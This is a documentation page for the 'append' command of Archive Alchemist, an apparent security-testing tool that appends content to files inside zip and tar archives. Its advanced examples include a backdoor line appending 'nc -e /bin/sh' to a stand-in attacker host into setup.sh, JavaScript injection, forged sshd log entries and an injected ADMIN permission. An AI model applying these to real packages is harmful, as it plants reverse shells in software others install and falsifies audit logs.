# Archive Alchemist: append Command

## Overview

The `append` command adds additional content to the end of existing files in an archive. This allows you to modify files without replacing their entire content, which is useful for adding configuration lines, injecting code, or extending log files.

## Syntax

```bash
./archive-alchemist.py <archive> [-t <type>] append <path> [options]
```

## Options

| Option | Description | Default | Example |
|--------|-------------|---------|---------|
| `<path>` | Path within the archive to append to (required) | N/A | `file.txt`, `config.ini`, `logs/app.log` |
| `--content` | Text content to append to the file | Empty | `--content "\nAdditional line"` |
| `--content-file` | Path to a local file whose content should be appended | None | `--content-file /path/to/append-content.txt` |

**Note**: Either `--content` or `--content-file` must be specified.

## Examples

### Append Text to a File

```bash
# Append a new line to a text file
./archive-alchemist.py archive.zip append config.txt --content "\nport=8080"

# Append content without a newline
./archive-alchemist.py archive.zip append data.txt --content "appended text"
```

### Append Content from Another File

```bash
# Append content from a local file
./archive-alchemist.py archive.tar -t tar append logs/app.log --content-file /path/to/new_logs.txt
```

### Append Multiple Lines

```bash
# Append multiple lines to a configuration file
./archive-alchemist.py archive.zip append config.ini --content "\n[new_section]\nkey1=value1\nkey2=value2"
```

### Append to Binary Files

```bash
# Append data to a binary file
./archive-alchemist.py archive.zip append data.bin --content-file /path/to/binary_chunk
```

## Advanced Examples

### Injecting Code

```bash
# Inject JavaScript code into a JS file
./archive-alchemist.py webapp.zip append assets/js/main.js --content "\n\nalert('Injected code');"

# Append a backdoor to a shell script
./archive-alchemist.py package.tar -t tar append setup.sh --content "\n\n# Backdoor\nnc -e /bin/sh attacker.com 1337 &"
```

### Adding Lines to Log Files

```bash
# Append fake log entries
./archive-alchemist.py logs.zip append system.log --content "\nJun 15 14:30:45 server sshd[1234]: Accepted password for admin from 192.168.1.1"
```

### Adding Configuration Options

```bash
# Append new configuration options
./archive-alchemist.py app.zip append config/settings.xml --content "\n  <permission>ADMIN</permission>"
```

## Notes and Warnings

- The `append` command works only on existing files. If the specified file doesn't exist in the archive, the command will fail. Use the `add` command first if the file doesn't exist.

- When appending content, be mindful of line endings. If you want to start the appended content on a new line, include a newline character (`\n`) at the beginning of your content.

- Appending to binary files is supported, but you need to be careful about the format of the binary file. Appending arbitrary data to some binary formats (like compressed files, images, or executables) may corrupt them.

- The `append` command preserves the file's original attributes (mode, ownership, timestamps). To modify attributes while appending, use the `replace` command instead.

- For TAR archives with compression (tar.gz, tar.xz, tar.bz2), the entire archive needs to be rewritten when appending, which may take longer for large archives.

- Some text files may use specific line endings (Windows uses CRLF, Unix uses LF). Be aware of this when appending content to maintain consistency.